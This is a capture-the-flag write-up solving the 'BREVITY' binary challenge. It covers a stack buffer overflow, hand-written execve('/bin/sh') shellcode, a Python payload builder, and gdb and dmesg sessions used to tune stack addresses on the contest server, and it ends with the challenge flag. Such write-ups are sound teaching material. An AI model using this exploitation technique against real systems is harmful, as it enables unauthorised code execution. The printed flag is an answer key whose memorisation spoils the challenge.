## BREVITY [200]

## Solution
The binary `read()`s 56 bytes from `stdin` to a buffer on the stack that is only 16 bytes in length. This means that bytes 16-19 will overwrite the return address of `main()` and we can execute arbitrary code. However, this means that we only have 56 - 20 = 36 bytes of code to work with to spawn a shell.
```
ameise@STAHLKERN:~/CS2015/pwn/200_BREVITY$ gdb ./brevity 
Reading symbols from ./brevity...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080480aa <+0>:	    sub    esp,0x10
   0x080480ad <+3>:	    mov    edx,0x38
   0x080480b2 <+8>:	    mov    ecx,esp
   0x080480b4 <+10>:	mov    ebx,0x0
   0x080480b9 <+15>:	mov    eax,0x3
   0x080480be <+20>:	int    0x80
   0x080480c0 <+22>:	mov    ebx,0x1
   0x080480c5 <+27>:	mov    eax,0x4
   0x080480ca <+32>:	int    0x80
   0x080480cc <+34>:	add    esp,0x10
   0x080480cf <+37>:	ret    
End of assembler dump.
(gdb) break *0x080480b2
Breakpoint 1 at 0x80480b2
(gdb) break *0x080480cf
Breakpoint 2 at 0x80480cf
(gdb) run
Starting program: /home/ameise/CS2015/pwn/200_BREVITY/brevity 

Breakpoint 1, 0x080480b2 in main ()
(gdb) p/x $esp
$1 = 0xffff0c14
(gdb) c
Continuing.
aaaabbbbccccdddd
aaaabbbbccccdddd
�
Breakpoint 2, 0x080480cf in main ()
(gdb) p/x $esp
$2 = 0xffff0c24
```

The start of the buffer will be at `0xffff0c14` and the return address will be located at `0xffff0c24`. Our shellcode will then start directly after the return address at `0xffff0c28` (in fact, we will overwrite the legitimate return address to `0xffff0c28`.) The end of the bytes we are able to read in will be at `0xffff0c43`.

We will do a `syscall` to `execve()` in order to spawn a shell. `execve()` has the following prototype:
```C
int execve(const char *filename, char *const argv[], char *const envp[]);
```

Our call should look like this:
```C
execve("/bin/sh", NULL, NULL);
```

This corresponds to the following x86 code:
```
mov    edx, 0x0             ; NULL
mov    ecx, 0x0             ; NULL
mov    ebx, 0xaabbccdd      ; address of null-terminated "sh"
mov    eax, 0xb             ; syscall number for execve()
int    0x80
```

We can't have null bytes in our shellcode, however, so we will `xor` registers instead to zero them out and then add values to their lowest byte if necessary:
```
xor    edx, edx             ; NULL
xor    ecx, ecx             ; NULL
mov    ebx, 0xaabbccdd      ; address of null-terminated "sh"
xor    eax, eax
mov    al, 0xb              ; syscall number for execve()
int    0x80
```

We can use pwnlib's x86 assembler to get our shellcode:
```
ameise@STAHLKERN:~/CS2015/pwn/200_BREVITY$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> context.arch = 'i386'
>>> context.os = 'linux'
>>> context.endian = 'little'
>>> asm_code = """
... xor edx, edx
... xor ecx, ecx
... mov ebx, 0xaabbccdd
... xor eax, eax
... mov al, 0xb
... int 0x80
... """
>>> shellcode = asm(asm_code)
>>> shellcode
'1\xd21\xc9\xbb\xdd\xcc\xbb\xaa1\xc0\xb0\x0b\xcd\x80'
>>> len(shellcode)
15
```

Now we have our shellcode. We pad 16 bytes to get to the return address, overwrite the return address with the address of the start of the shellcode (`0xffff0c28`), write our 15 bytes of shellcode, and then `"sh\x00"`. Since the address of `"sh"` on the stack may differ natively compared to when we ran it in `gdb`, we will leave this as `0xaabbccdd` and patch it later.
```Python
BUFFERSTART = 0xffff0c14

def LittleEndian(hexnum):
  s = ""
  s += chr( (hexnum) & 0xff)
  s += chr( (hexnum >> 8) & 0xff)
  s += chr( (hexnum >> 16) & 0xff) 
  s += chr( (hexnum >> 24) & 0xff) 
  return s

bufferstart = BUFFERSTART

# shellcode is split to enable easy hard-coded address patching
addr_of_shellcode = bufferstart + 16 + 4
shellcode_p1 = "1\xd21\xc9\xbb"
address_of_sh = bufferstart + 16 + 4 + 15
shellcode_p2 = "1\xc0\xb0\x0b\xcd\x80"

payload = ""
payload += "a"*16
payload += LittleEndian(addr_of_shellcode)
payload += shellcode_p1
payload += LittleEndian(address_of_sh)
payload += shellcode_p2
payload += "/bin/sh\x00"

#for c in payload:
#  sys.stdout.write("\\x" + hex(ord(c))[2:].zfill(2))
#sys.stdout.write('\n')

fp = open("input","wb")
fp.write(payload)
fp.close()
```

This will work locally in `gdb`. However, we need it to work on the CyberStakes server, so we have to open the binary in `gdb` on the server and find the new buffer start. In this case, it is `0xffff1334` instead of `0xffff0c14` on our machine:
```
ameise@shell:/tmp/ameise$ gdb /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity -q
Reading symbols from /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity...(no debugging symbols found)...done.
(gdb) set disassembly intel
(gdb) disas main
Dump of assembler code for function main:
   0x080480aa <+0>:	sub    esp,0x10
   0x080480ad <+3>:	mov    edx,0x38
   0x080480b2 <+8>:	mov    ecx,esp
   0x080480b4 <+10>:	mov    ebx,0x0
   0x080480b9 <+15>:	mov    eax,0x3
   0x080480be <+20>:	int    0x80
   0x080480c0 <+22>:	mov    ebx,0x1
   0x080480c5 <+27>:	mov    eax,0x4
   0x080480ca <+32>:	int    0x80
   0x080480cc <+34>:	add    esp,0x10
   0x080480cf <+37>:	ret    
End of assembler dump.
(gdb) break *0x080480b2
Breakpoint 1 at 0x80480b2
(gdb) run
Starting program: /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity 

Breakpoint 1, 0x080480b2 in main ()
(gdb) p/x $esp
$1 = 0xffff1344
```

Now we modify our Python code to reflect the new start address and it will work in `gdb` on the server:
```
ameise@shell:/tmp/ameise$ nano solve.py
[...]
BUFFERSTART = 0xffff1334
[...]
ameise@shell:/tmp/ameise$ python solve.py 
ameise@shell:/tmp/ameise$ cat input | xxd
0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
0000010: 5813 ffff 31d2 31c9 bb67 13ff ff31 c0b0  X...1.1..g...1..
0000020: 0bcd 802f 6269 6e2f 7368 00              .../bin/sh.
ameise@shell:/tmp/ameise$ gdb /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity -q
Reading symbols from /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity...(no debugging symbols found)...done.
(gdb) set disassembly intel
(gdb) disas main
Dump of assembler code for function main:
   0x080480aa <+0>:	sub    esp,0x10
   0x080480ad <+3>:	mov    edx,0x38
   0x080480b2 <+8>:	mov    ecx,esp
   0x080480b4 <+10>:	mov    ebx,0x0
   0x080480b9 <+15>:	mov    eax,0x3
   0x080480be <+20>:	int    0x80
   0x080480c0 <+22>:	mov    ebx,0x1
   0x080480c5 <+27>:	mov    eax,0x4
   0x080480ca <+32>:	int    0x80
   0x080480cc <+34>:	add    esp,0x10
   0x080480cf <+37>:	ret    
End of assembler dump.
(gdb) break *0x080480cf
Breakpoint 1 at 0x80480cf
(gdb) display/3i $eip
1: x/3i $eip
<error: No registers.>
(gdb) run < input
Starting program: /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity < input
aaaaaaaaaaaaaaaaX��1�1ɻg��1��
                               /bin/sh
Breakpoint 1, 0x080480cf in main ()
1: x/3i $eip
=> 0x80480cf <main+37>:	ret    
   0x80480d0:	add    BYTE PTR [esi],ch
   0x80480d2:	jae    0x804814d
(gdb) si
0xffff1358 in ?? ()
1: x/3i $eip
=> 0xffff1358:	xor    edx,edx
   0xffff135a:	xor    ecx,ecx
   0xffff135c:	mov    ebx,0xffff1367
(gdb) si
0xffff135a in ?? ()
1: x/3i $eip
=> 0xffff135a:	xor    ecx,ecx
   0xffff135c:	mov    ebx,0xffff1367
   0xffff1361:	xor    eax,eax
(gdb) si
0xffff135c in ?? ()
1: x/3i $eip
=> 0xffff135c:	mov    ebx,0xffff1367
   0xffff1361:	xor    eax,eax
   0xffff1363:	mov    al,0xb
(gdb) si
0xffff1361 in ?? ()
1: x/3i $eip
=> 0xffff1361:	xor    eax,eax
   0xffff1363:	mov    al,0xb
   0xffff1365:	int    0x80
(gdb) si
0xffff1363 in ?? ()
1: x/3i $eip
=> 0xffff1363:	mov    al,0xb
   0xffff1365:	int    0x80
   0xffff1367:	das    
(gdb) si
0xffff1365 in ?? ()
1: x/3i $eip
=> 0xffff1365:	int    0x80
   0xffff1367:	das    
   0xffff1368:	bound  ebp,QWORD PTR [ecx+0x6e]
(gdb) si
process 23989 is executing new program: /bin/dash
Warning:
Cannot insert breakpoint 1.
Cannot access memory at address 0x80480cf
```

However, this will not work perfectly when we run the binary natively (due to some stack offsets being influenced by environment variables inside and outside of `gdb`). We can use `dmesg | tail -n 5` to look at crash information from the binary crashing to determine how much we need to adjust the stack address from `0xffff1344`:
```
ameise@shell:/tmp/ameise$ cat input -| /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity
aaaaaaaaaaaaaaaaX��1�1ɻg��1��
                               /bin/sh
Segmentation fault
ameise@shell:/tmp/ameise$ dmesg | tail -n 1
[17147666.233090] brevity[24488]: segfault at 38 ip 00000000ffff1358 sp 00000000ffff1328 error 6
```

We know that after the overwritten `ret` is called, the stack pointer will be pointing to our shellcode. However, this crash message shows that the stack pointer is `0xffff1328` while the instruction pointer faulted at `0xffff1358`. If we subtract `0x30` from our start address in `solve.py` and generate a new input file, it will work natively:
```
ameise@shell:/tmp/ameise$ nano solve.py 
[...]
BUFFERSTART = 0xffff1314
[...]
ameise@shell:/tmp/ameise$ python solve.py 
ameise@shell:/tmp/ameise$ cat input | xxd
0000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
0000010: 2813 ffff 31d2 31c9 bb37 13ff ff31 c0b0  (...1.1..7...1..
0000020: 0bcd 802f 6269 6e2f 7368 00              .../bin/sh.
ameise@shell:/tmp/ameise$ cat input -| /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9/brevity
aaaaaaaaaaaaaaaa(��1�1ɻ7��1��
                               /bin/sh

whoami
ameise
pwd
/tmp/ameise
cd /home/problems/ffea9c42b57ff63588ae3542bd0b0d9b/brevity_9  
ls
brevity  flag
cat flag
497836FdBB9D2aBC_the_force_is_strong_with_you
```